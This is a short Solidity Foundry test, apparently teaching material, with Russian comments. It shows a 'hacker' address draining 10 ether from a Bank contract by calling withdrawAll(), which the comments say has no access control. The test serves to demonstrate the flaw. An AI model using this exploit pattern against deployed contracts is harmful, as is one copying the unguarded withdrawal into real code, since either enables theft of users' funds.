// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Bank} from "../src/Bank.sol";

contract Hack is Test {
    Bank public bank;
    address hacker = address(0xBAD);

    function setUp() public {
        bank = new Bank();
        vm.deal(address(bank), 10 ether);
    }

    function test_HackerDrainsBank() public {
        // Банк полон, у хакера пусто
        assertEq(address(bank).balance, 10 ether);
        assertEq(hacker.balance, 0);

        // Хакер вызывает withdrawAll() — access control отсутствует
        vm.prank(hacker);
        bank.withdrawAll();

        // Банк пуст, все деньги у хакера
        assertEq(address(bank).balance, 0);
        assertEq(hacker.balance, 10 ether);
    }
}
